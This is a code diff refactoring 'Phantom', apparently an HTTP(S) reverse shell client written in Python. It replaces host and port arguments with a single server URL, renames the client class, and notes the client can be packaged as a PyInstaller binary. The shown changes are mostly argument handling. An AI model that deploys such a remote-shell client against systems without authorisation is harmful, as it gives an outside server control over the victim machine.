@@ -13,24 +13,24 @@ from urllib.request import Request, urlopen
 from urllib import parse
 
 from src.client.commands import ClientCommands
+from src.phantom import Phantom
 
 
-class Client:
+class ShellClient(Phantom):
     def __init__(self,
-                 server_address: str,
-                 server_port: int, *,
+                 server_url: str, *,
                  ca_cert: [str, Path, None]):
         """Create a Reverse Shell Client that receives commands from a
-        server though HTTP(S).
+        server through HTTP(S).
 
-        :param server_address: Hostname or address of the server.
-        :param server_port: Port number used by the server.
+        :param server_url: Full URL for the server (with optional port
+            number) in the format 'SCHEME://DOMAIN|ADDRESS[:PORT]'.
+            Ex: http://192.168.0.10:8080 or https://your-domain.com
         :param ca_cert: Path to a file containing the certificate for
             the Certificate Authority (CA) in PEM format. Connects to
             HTTP servers if set to None.
         """
-        self.server_address = server_address
-        self.server_port = server_port
+        super().__init__(server_url)
         self._commands = ClientCommands(self)
         self.ca_cert = ca_cert
 
@@ -58,11 +58,6 @@ class Client:
                 cafile=str(cert)
             )
         self._ca_cert = cert
-
-    @property
-    def server_url(self) -> str:
-        url_scheme = "http" if self._ssl_context is None else "https"
-        return f"{url_scheme}://{self.server_address}:{self.server_port}"
 
     @property
     def _shell_prompt(self) -> str:
@@ -106,19 +101,14 @@ if __name__ == "__main__":
     import argparse
 
     parser = argparse.ArgumentParser(
-        description="Phantom - HTTP(S) Reverse Shell Client"
+        description="Phantom - A cross-platform HTTP(S) Reverse Shell Client"
     )
     parser.add_argument(
-        "--host",
+        "--url",
         type=str,
-        metavar="<hostname/address>",
-        help="Address or hostname of the server to connect to."
-    )
-    parser.add_argument(
-        "-p", "--port",
-        type=int,
-        metavar="<port>",
-        help="Port number exposed by the server."
+        help="Full URL of the server (with optional port number) in the format "
+             "'SCHEME://DOMAIN|ADDRESS[:PORT]'. "
+             "Ex: http://192.168.0.10:8080 or https://your-domain.com"
     )
     parser.add_argument(
         "--ca-cert",
@@ -130,7 +120,7 @@ if __name__ == "__main__":
 
     _args = parser.parse_args()
 
-    if not all((_args.host, _args.port)):
+    if _args.url is None:
         '''Client is executed as a binary compiled by PyInstaller. All 
         configuration options are read from the 'config.py' file that 
         is created and bundled in the binary during the build process 
@@ -150,8 +140,4 @@ if __name__ == "__main__":
         from the CLI.'''
         args = _args
 
-    Client(
-        server_address=args.host,
-        server_port=int(args.port),
-        ca_cert=args.ca_cert
-    ).execute()
+    ShellClient(server_url=args.url, ca_cert=args.ca_cert).execute()
